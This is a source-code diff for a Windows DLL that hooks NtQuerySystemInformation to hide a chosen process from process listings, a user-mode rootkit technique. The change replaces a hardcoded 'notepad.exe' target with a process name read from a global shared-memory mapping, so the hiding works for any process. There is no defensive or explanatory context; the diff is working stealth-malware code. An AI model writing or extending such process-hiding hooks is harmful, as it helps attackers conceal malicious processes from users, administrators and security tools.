@@ -6,7 +6,7 @@
 
 PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation;
 PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation;
-char* process;
+wchar_t* process;
 
 NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
 	SYSTEM_INFORMATION_CLASS SystemInformationClass,
@@ -26,7 +26,7 @@ NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
 		P_SYSTEM_PROCESS_INFORMATION curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);
 
 		while (prev->NextEntryOffset != NULL) {
-			if (!lstrcmp(curr->ImageName.Buffer, L"notepad.exe")) {
+			if (!lstrcmp(curr->ImageName.Buffer, process)) {
 				if (curr->NextEntryOffset == 0) {
 					prev->NextEntryOffset = 0;		// if above process is at last
 				}
@@ -69,9 +69,23 @@ bool set_nt_hook()
 }
 
 void get_process_name() {
-	//
-	// TODO: Access Shared Memory (File Mapping) and Retrieve name of process to hide
-	//
+	HANDLE map = OpenFileMappingA(
+		FILE_MAP_ALL_ACCESS,
+		FALSE,
+		"Global\\GetProcessName"
+	);
+
+	LPVOID buf = MapViewOfFile(map, // handle to map object
+		FILE_MAP_ALL_ACCESS,  // read/write permission
+		0,
+		0,
+		255);
+
+	process = (wchar_t*)malloc(255 * sizeof(wchar_t));
+	MultiByteToWideChar(CP_UTF8, 0, (char*)buf, -1, process, 255);
+
+	UnmapViewOfFile(buf);
+	CloseHandle(map);
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
